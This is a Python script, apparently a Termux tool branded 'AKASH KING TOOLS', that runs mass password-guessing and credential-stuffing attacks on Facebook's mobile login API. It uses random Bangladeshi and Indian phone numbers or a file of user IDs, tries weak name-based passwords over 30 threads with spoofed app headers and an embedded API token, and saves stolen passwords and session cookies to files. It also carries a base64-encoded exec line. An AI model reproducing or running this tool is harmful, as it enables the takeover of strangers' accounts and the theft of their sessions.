# Modified /storage/emulated/0/LL.py (Paid Gates Removed, Original Functions Restored)
import os
import sys
import time
import uuid
import json
import zlib
import base64
import random
import string
import shutil
import hashlib
import platform
import datetime
import itertools
import threading
import subprocess
import webbrowser
import urllib.request
from urllib.request import Request, urlopen
from concurrent.futures import ThreadPoolExecutor

# --- 1. INITIAL SETUP, PACKAGES & VOICE ALERTS ---
os.system('pkg install espeak')
os.system('pip install rich')
os.system('pip install requests')

print('\033[38;5;46m[\033[1;97m+\033[38;5;46m] \033[1;93mWELCOME TO AKASH KING TOOLS')
os.system('espeak -a 300 "WELCOME, TO, AKASH, KING, TOOLS,"')

print('\033[38;5;46m[\033[1;97m+\033[38;5;46m] \033[1;91mONLY PAID USER')
os.system('espeak -a 300 "ONLY, PAID, USER,"')

print('\033[38;5;46m[\033[1;97m+\033[38;5;46m] \033[1;94mALL COUNTRY WORKING TOOLS 100%')
os.system('espeak -a 300 "ALL, COUNTRY, WORKING, TOOLS ,"')

print('\033[38;5;46m[\033[1;97m+\033[38;5;46m] \033[1;92mUPDATE VERSION 11.0')
os.system('espeak -a 300 "UPDATE, VERSION, 11.0 ,"')

try:
    import requests
except ImportError:
    print('\033[38;5;46m[\033[1;97m=\033[38;5;46m] INSTALLING REQUESTS ')
    os.system('espeak -a 300 "INSTALLING REQUESTS,"')
    os.system('pip install requests')
    import requests

try:
    import concurrent.futures
except ImportError:
    print('\033[38;5;46m[\033[1;97m=\033[38;5;46m] INSTALLING FUTURES ')
    os.system('espeak -a 300 "INSTALLING FUTURES ,"')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

# Set terminal title to: 🔐 AKASH 🔐
exec(base64.b64decode(b'c3lzLnN0ZG91dC53cml0ZSgnXHgxYl0yO/CflLAgQUtBU0gg8J+UsFx4MDcnKQ=='))

# --- 2. GLOBAL VARIABLES & CONFIG ---
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
plist = []

head = {
    "Host": "adsmanager.facebook.com",
    "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
    "viewport-width": "980"
}

# --- 3. UI & BANNER FUNCTIONS ---
def clear():
    os.system('clear')

def linex():
    print('\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def logo():
    print("""\033[38;5;46m
     █████╗ ██╗  ██╗ █████╗ ███████╗██╗  ██╗
    ██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║  ██║
    ███████║█████╔╝ ███████║███████╗███████║
    ██╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║
    ██║  ██║██║  ██╗██║  ██║███████║██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ \033[1;92m/11.0
\033[1;91m[\033[1;35m+\033[1;91m] \033[1;93mDEVELOPER \033[1;91m: \033[1;93mAKASH KING
\033[1;91m[\033[1;35m+\033[1;91m] \033[1;92mFACEBOOK  \033[1;91m: \033[1;92mAKASH KING
\033[1;91m[\033[1;35m+\033[1;91m] \033[1;94mWHATSAPP  \033[1;91m: \033[1;94m+8801622094293
\033[1;91m[\033[1;35m+\033[1;91m] \033[1;93mSTATUS    \033[1;91m: \033[38;5;46mUNLOCKED""")
    linex()

# --- 4. MENUS & RANDOM CLONING ---
def main1():
    clear()
    logo()
    print("MAIN PROGRAM STARTED...")
    print("\033[1;93m[1] \033[1;93mFILE CLONING")
    print("\033[1;94m[2] \033[1;94mRANDOM CLONING")
    print("\033[1;95m[3] \033[1;95mCONTACT ADMIN")
    print("\033[1;96m[0] \033[1;96mEXIT")
    linex()
    select = input("\033[1;93m[?] SELECT OPTION: ")
    if select == '1':
        _file_()
    elif select == '2':
        _randm_()
    elif select == '3':
        os.system('xdg-open https://wa.me/+8801622094293')
        main1()
    elif select == '0':
        print(" EXIT DONE ")
        sys.exit()
    else:
        print(" VALID OPTION ")
        time.sleep(1)
        main1()

def _file_():
    main_crack().crack()

def _randm_():
    clear()
    logo()
    print("\033[1;93m[1] BANGLADESH CLONING")
    print("\033[1;98m[2] INDIA CLONING")
    print("\033[1;96m[0] BACK")
    linex()
    select = input("CHOICE : ")
    if select == '1':
        _bd_()
    elif select == '2':
        _India_()
    else:
        main1()

def _bd_():
    clear()
    logo()
    print("EXAMPLE SIM CODE : 017, 019, 018, 016")
    code = input("CHOICE SIM CODE  : ")
    name = "".join(random.choice(string.digits) for _ in range(2))
    cod = "".join(random.choice(string.digits) for _ in range(2))
    print("EXAMPLE LIMIT    : 3000, 5000, 10000, 99999")
    limit = int(input("TOTAL UID        : "))
    
    user = []
    for _ in range(limit):
        nmp = "".join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
        
    clear()
    logo()
    print(f"TOTAL UID : {len(user)}")
    print("TURN ON/OFF AIRPLANE MODE EVERY 5 MIN")
    linex()
    
    with ThreadPoolExecutor(max_workers=30) as sexy:
        for love in user:
            ids = code + name + cod + love
            psd = [
                name + cod + love,
                cod + love,
                code + name + cod + love,
                code + code,
                "bangladesh",
                "Bangladesh",
                "freefire",
                "i love you",
                "iloveyou"
            ]
            sexy.submit(randm, ids, psd)
            
    linex()
    print("THE PROCESS HAS BEEN COMPLETED")
    print(f"TOTAL OK ID : {len(oks)}")
    print(f"TOTAL CP ID : {len(cps)}")
    linex()
    input("PRESS ENTER TO BACK ")
    main1()

def _India_():
    clear()
    logo()
    print("EXAMPLE : +91639, +91934, +91902, +91701")
    code = input("SIM CODE : ")
    limit = int(input("TOTAL UID : "))
    
    user = []
    for _ in range(limit):
        nmp = "".join(random.choice(string.digits) for _ in range(5))
        user.append(nmp)
        
    clear()
    logo()
    print(f"TOTAL UID : {len(user)}")
    print("TURN ON/OFF AIRPLANE MODE EVERY 5 MIN")
    linex()
    
    with ThreadPoolExecutor(max_workers=30) as sexy:
        for love in user:
            ids = code + love
            psd = [love, ids, "57273200", "59039200", "57575751"]
            sexy.submit(randm, ids, psd)
            
    linex()
    print("THE PROCESS HAS BEEN COMPLETED")
    print(f"TOTAL OK ID : {len(oks)}")
    print(f"TOTAL CP ID : {len(cps)}")
    linex()
    input("PRESS ENTER TO BACK ")
    main1()

# --- 5. FILE CLONING CLASS (METHODS A & B) ---
class main_crack:
    def __init__(self):
        self.id = []

    def crack(self):
        clear()
        logo()
        file_path = input("ENTER FILE PATH (e.g. /sdcard/AKASH.txt): ")
        try:
            self.id = open(file_path, "r").read().splitlines()
        except FileNotFoundError:
            print(" FILE NOT FOUND ... TRY AGAIN ...")
            time.sleep(2)
            self.crack()
            return
        self.pasw()

    def methodA(self, sid, name, psw):
        global oks, cps, loop
        sys.stdout.write(f"\r[AKASH-M1] {loop} | OK:{len(oks)} | CP:{len(cps)} ")
        sys.stdout.flush()
        
        first = name.split(" ")[0]
        last = name.split(" ")[1] if len(name.split(" ")) > 1 else first
        session = requests.Session()
        
        for pw in psw:
            ps = pw.replace("first", first.lower()).replace("First", first).replace("last", last.lower()).replace("Last", last)
            ua = f"[FBAN/FB4A;FBAV/{random.randrange(11, 99)}.0.0.{random.randrange(1111, 9999)};FBBV/{random.randrange(1111111, 9999999)};[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{{density=2.625,width=1080,height=2042}};FBLC/en_US;FBRV/219312803;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
            
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": sid,
                "password": ps,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
            }
            try:
                q = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
                if "session_key" in q:
                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                    swagb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                    cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\033[1;32m[AKASH-OK] {sid} | {ps}")
                    oks.append(sid)
                    open("/sdcard/AKASH-M1-FILE-OK.txt", "a").write(f"{sid}|{ps}|{cookie}\n")
                    break
                elif "www.facebook.com" in q.get("error", {}).get("message", ""):
                    print(f"\r\033[1;33m[AKASH-CP] {sid} | {ps}")
                    cps.append(sid)
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop += 1

    def methodB(self, sid, name, psw):
        global oks, cps, loop
        sys.stdout.write(f"\r[AKASH-M2] {loop} | OK:{len(oks)} | CP:{len(cps)} ")
        sys.stdout.flush()
        
        first = name.split(" ")[0]
        last = name.split(" ")[1] if len(name.split(" ")) > 1 else first
        session = requests.Session()
        
        for pw in psw:
            ps = pw.replace("first", first.lower()).replace("First", first).replace("last", last.lower()).replace("Last", last)
            ua = "[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/219312803;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": sid,
                "password": ps,
                "generate_analytics_claims": "1",
                "community_id": "",
                "cpl": "true",
                "try_num": "1",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "fb_api_req_friendly_name": "authenticate",
                "api_key": "62f8ce9f74b12f84c123cc23437a4a32",
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            }
            headers = {
                "User-Agent": ua,
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            }
            try:
                q = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers).json()
                if "session_key" in q:
                    coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                    print(f"\r\033[1;32m[AKASH-M2-OK] {sid} | {ps} | [COOKIE] {coki}")
                    oks.append(sid)
                    open("/sdcard/AKASH-M2-FILE-OK.txt", "a").write(f"{sid}|{ps}|{coki}\n")
                    break
                elif "www.facebook.com" in q.get("error", {}).get("message", ""):
                    cps.append(sid)
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop += 1

    def pasw(self):
        clear()
        logo()
        print("[1] METHOD 1 (GRAPH)")
        print("[2] METHOD 2 (B-GRAPH)")
        m_choice = input("[?] SELECT METHOD: ")
        linex()
        print("[1] AUTO PASSWORD (BEST)")
        print("[2] CHOICE PASSWORD (BD 10-18 / INDIA 3-5)")
        p_choice = input("[?] SELECT PASSWORD SYSTEM: ")
        
        pwx = []
        if p_choice == "1":
            pwx = [
                "firstlast", "first last", "first123", "first1234", "first12345",
                "first@123", "572730", "575757", "first786", "first018", "123123",
                "freefire", "i love you", "iloveyou", "bangladesh", "akash123",
                "hakim123", "first017", "last123", "last017", "first111",
                "first12", "firstlast1"
            ]
        else:
            lim = int(input("HOW MANY PASSWORDS DO YOU WANT TO ADD?: "))
            for i in range(lim):
                pwx.append(input(f"ENTER PASSWORD {i+1}: "))

        clear()
        logo()
        print(f"TOTAL FILE IDS : {len(self.id)}")
        print("USE AIRPLANE MODE FOR GOOD RESULTS")
        linex()
        
        with ThreadPoolExecutor(max_workers=30) as swagworld:
            for zsb in self.id:
                uid, name = zsb.split("|")
                if m_choice == "1":
                    swagworld.submit(self.methodA, uid, name, pwx)
                else:
                    swagworld.submit(self.methodB, uid, name, pwx)

# --- 6. RANDOM CLONING WORKER ---
def randm(ids, psd):
    global oks, cps, loop
    sys.stdout.write(f"\r[AKASH-R1] {loop} | OK:{len(oks)} | CP:{len(cps)} ")
    sys.stdout.flush()
    
    for pas in psd:
        data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "email": ids,
            "password": pas,
            "generate_analytics_claims": "1",
            "community_id": "",
            "cpl": "true",
            "try_num": "1",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "password",
            "source": "login",
            "error_detail_type": "button_with_disabled",
            "enroll_misauth": "false",
            "generate_session_cookies": "1",
            "generate_machine_id": "1",
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "US",
            "fb_api_req_friendly_name": "authenticate",
            "api_key": "62f8ce9f74b12f84c123cc23437a4a32",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
        }
        head = {
            "User-Agent": "[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/219312803;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "X-FB-Connection-Type": "WIFI",
            "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32",
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            "X-FB-HTTP-Engine": "Liger"
        }
        try:
            url = "https://b-graph.facebook.com/auth/login"
            q = json.loads(requests.post(url, data=data, headers=head).text)
            if "session_key" in q:
                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                print(f"\r\033[1;32m[AKASH -OK] {ids} | {pas} | [COOKIE] {coki}")
                oks.append(ids)
                open("/sdcard/AKASH -OK.txt", "a").write(f"{ids}|{pas}|{coki}\n")
                break
            elif "www.facebook.com" in q.get("error", {}).get("message", ""):
                cps.append(ids)
                break
        except Exception:
            pass
    loop += 1

if __name__ == "__main__":
    main1()
